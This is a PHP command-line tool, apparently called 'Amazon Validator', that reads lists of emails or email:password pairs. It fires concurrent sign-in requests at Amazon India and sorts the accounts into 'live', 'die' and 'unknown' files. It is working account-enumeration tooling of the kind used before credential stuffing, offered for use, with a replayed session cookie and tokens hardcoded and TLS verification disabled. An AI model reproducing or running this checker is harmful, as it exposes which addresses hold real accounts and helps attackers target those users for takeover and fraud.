<?php
ini_set("memory_limit", '-1');
date_default_timezone_set('Asia/Jakarta');
define("OS", strtolower(PHP_OS));
banner();

menu:
echo color()["RED"]."Choose Your Validator : \n";
echo color()["GR"]."\n";
echo color()["GR"]." - [ 1 ]. Amazon Validator\n";
echo color()["YL"]."\n * [ Selection ]	: ";
$menu = trim(fgets(STDIN));
if ($menu== "1"){
require_once "RollingCurl/RollingCurl.php";
require_once "RollingCurl/Request.php";

enterlist:
$listname = readline(" * [ Enter Your List ]	:  ");
if(empty($listname) || !file_exists($listname)) {
	echo"[?] list not found".PHP_EOL;
	goto enterlist;
}
else if($listname == "n") {
	echo "[?] list not found".PHP_EOL;
	goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));
$savedir = readline(" * [ Save Results ]	:     ");
$dir = empty($savedir) ? "results" : $savedir;
if(!is_dir($dir)) mkdir($dir);
chdir($dir);
reqemail:
$reqemail = readline(" * [ Ratio Check / S ]  : ");
echo color()["RED"]."----------------------------------------------------------------------------------\n";
echo color()["YL"]."                                   [ Process ] \n";
echo PHP_EOL;
$reqemail = (empty($reqemail) || !is_numeric($reqemail) || $reqemail <= 1) ? 4 : $reqemail;
if($reqemail > 1000) {
	echo "[!] max 1000".PHP_EOL;
	goto reqemail;
}
else if($reqemail == "1") {
	echo "[!] Minimail 2".PHP_EOL;
	goto reqemail;
}
$no = 0;
$total = count($lists);
$live = 0;
$die = 0;
$unknown = 0;
$c = 0;
$rollingCurl = new \RollingCurl\RollingCurl();
foreach($lists as $list) {
	$c++;
	if(strpos($list, "|") !== false) list($email, $pwd) = explode("|", $list);
	else if(strpos($list, ":") !== false) list($email, $pwd) = explode(":", $list);
	else $email = $list;
	if(empty($email)) continue;
	$email = str_replace(" ", "", $email);
	$data = 'appActionToken=ZTPXbz8ASkxVESD91j2Bni5IrtfzEj3D&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&openid.return_to=ape:aHR0cHM6Ly93d3cuYW1hem9uLmluLz9fZW5jb2Rpbmc9VVRGOCZyZWZfPW5hdl95YV9zaWduaW4=&prevRID=ape:UzkxWVI5N0QzS0pSVktZRDNBUFM=&workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.BPSBkqTR6P5jvx1o8SwHZewxXZPQD9INnQwrTK7E10KGkJNKmRQrXg.Bpfw0MRekI04gLqe.sdnwmtH-Osy1zKXEYzD6fPzWPPkCwu3pcOTIb217gRrL3gj490WMz3YXHBxRVX3qxdlY9exrx6PRATEeoh-AGw692JhnSg7gbABo-1LcPjHhUYivUUt5vddd0DeqK_vrSCF0bQD0GedxfGtZ3jKoTrXh_OnuJz776sg3Bt3I5mCrZM5n06GPVrKg01Xrkuc-eJnv3CrFfIa7N7n4hbkGSaTpQBRyVjuXl5_QcsAcn14xUpCuXOVr8KDDp61TD5-7Ztw4NwDz6t7YNW0V4fqUkVM96lfk6DzWIS12p3k6BfiuyMLAxKyVhI4B_3bXiZayUJJd._JOpkNwt9xXjnJOjnb21AA&email='.$email.'&password=&create=0';
    $headers = array();
	$headers[] = 'Authority: www.amazon.in';
	$headers[] = 'Host: www.amazon.in';
	$headers[] = 'Origin: https://www.amazon.in';
	$headers[] = 'Content-Type: application/x-www-form-urlencoded';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0';
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
	$headers[] = 'Referer: https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3F_encoding%3DUTF8%26ref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&';
	$headers[] = 'Cookie: session-id=262-1272399-7205267; session-id-time=2218483162l; csm-hit=tb:GXHK3MMM75GG12CED0BV+s-S91YR97D3KJRVKYD3APS|1587763220032&t:1587763220032&adb:adblk_no; ubid-acbin=259-8137026-1769365; session-token=Z+vdm5H9Ixz8ux8leZZ9q9turVyQKimOjnNfM3omfjD+H2pGXRSz2SCxkRrcENBNthBpG2Kv/NZu5GUEPeIaMXDL+4XKgen0hon6DFldX9A6CVK1PGA9dIx+wz4oDfDo6jsqsFOwu8eT6FiybmshDRkSZOrlnyNy+rJjDw0wPcd0if0NeoE7zIhww/E6On5M; i18n-prefs=INR; visitCount=2';
	$rollingCurl->setOptions(array(CURLOPT_RETURNTRANSFER => 1, CURLOPT_ENCODING => "gzip", CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4))->post("https://www.amazon.in/ap/signin?jembot=$email", $data, $headers);
}
$rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {
	global $listname, $dir, $no, $total, $live, $die, $unknown;
	$no++;
	parse_str(parse_url($request->getUrl(), PHP_URL_QUERY), $params);
	$email = $params["jembot"];
	$x = $request->getResponseText();
	echo color()["BL"]." - [".$no."/".$total."]-[".date("H:i:s")."]";
	if (inStr($x, 'There was a problem')) {
	$die++;
		file_put_contents("die.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["RED"]." DIE".color()["RED"]." => ".$email;
	}else  if (inStr($x, 'Forgot Password')) {
	$live++;
		file_put_contents("live.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["GR"]." LIVE".color()["GR"]." => ".$email;
	} else {
	$unknown++;
		file_put_contents("UKNOWN.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["PUR"]." UNKNOWN".color()["PUR"]." => ".$email;
	}
	
    echo "";
    
    echo PHP_EOL;
})->setSimultaneousLimit((int) $reqemail)->execute();
system('clear');
echo PHP_EOL."-- Checking Done --\n-- Total: ".$total." - Live: ".$live." - Die: ".$die." - Unknown: ".$unknown." Saved to dir \"".$dir."\" -- \n".PHP_EOL;
}
else if ($menu== "2"){
echo "Coomingsoon\n" ;
}
else if (empty($menu)){
    echo color()["RED"]."[x] ".color()["WH"]."Perintah Tidak Boleh Kosong";
   	goto menu;
	}
else{
	echo color()["RED"]."[x] ".color()["WH"]."Perintah Tidak Dikenali";
	goto menu;
	}
function banner(){
	    
	echo color()["RED"]."---------------------------------------------------------------------------------\n";
	echo color()["GRB"]."                 [ Amazon Validator - ./ElyanaGimang ] \n";
    }    

function color() {
	return array(
		"WH" => "\e[0;37m",
		"YL" => "\e[1;33m",
		"RED" => "\e[1;31m",
		"PUR" => "\e[0;35m",
		"CY" => "\e[0;36m",
		"GR" => "\e[1;32m",
		"GRB" => "\e[0;32m",
		"BL" => "\e[1;34m",
		
	);
}
function getStr($source, $start, $end) {
    $a = explode($start, $source);
    $b = explode($end, $a[0]);
    return $b[0];
}
function inStr($s, $as){
    $s = strtoupper($s);
    if(!is_array($as)) $as=array($as);
    for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
    return false;
    }

